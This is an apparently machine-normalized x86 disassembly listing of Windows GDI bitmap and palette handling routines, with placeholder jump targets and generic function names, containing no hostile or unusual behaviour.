test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_421e30
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_425b1c
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_425b48
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ef4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_425b48
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422134
xor edx edx
push ebp
push sub_425bdc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_422568
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_416848
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4223e0
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_425be8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422134
xor eax eax
push ebp
push sub_425cc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426f04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_425a64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427004
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422568
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4167ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4223e0
retn
sub_425cd8
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4036c0
sub_425cf8
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_425a64
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40dabc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_425d54
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_4207c4
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_425a64
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_425a64
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_425da0
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_423074
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425e4f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425e5c
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_425ea8
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_425a64
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_4228e0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_4228e0
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_4264f6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_402744
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426200
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_4227c0
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_4228e0
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_4228e0
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4228e0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_4228e0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4264a7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_426496
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_426474
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_4228e0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_425e5c
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028fc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_423074
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_421d14
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_414b64
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_421054
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_421cd8
call sub_421054
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_422838
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42647b
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_4228e0
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_42644a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_4228e0
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_402764
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_421054
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_421cd8
call sub_421054
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_421054
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_421cd8
call sub_421054
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_4228e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403f38
call sub_403f38
jmp r-xdata
sub_42649d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4264ac
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403eb4
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42650c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_426570
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_425a64
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42676b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_4228e0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_4228e0
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_4228e0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426723
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_425ea8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_42677c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_423a60
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_425cd4
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4267e4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_426ef4
mov eax [ esi + 0x28 ]
call sub_425cd8
mov eax [ esi + 0x2c ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_426820
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4268d8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402fc4
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4271c4
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_425cd4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_425cd8
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416a84
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_426910
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_426ef4
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42699f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_42650c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_425ea8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4271c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4269a4
mov eax [ ebp - 0x8 ]
call sub_4207c4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403eb4
call sub_403f08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_4269d0
push ebx
mov ebx eax
mov eax ebx
call sub_426cc4
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40dabc
pop ebx
retn
sub_426a00
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
call sub_418914
push edx
push eax
mov eax esi
call sub_418964
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_426ef4
lea eax [ ebx + 0x2c ]
call sub_40dabc
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4271c4
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_426a74
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4225bc
mov eax ebx
call sub_427004
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
pop edx
imul edx eax
mov eax edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_426e00
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
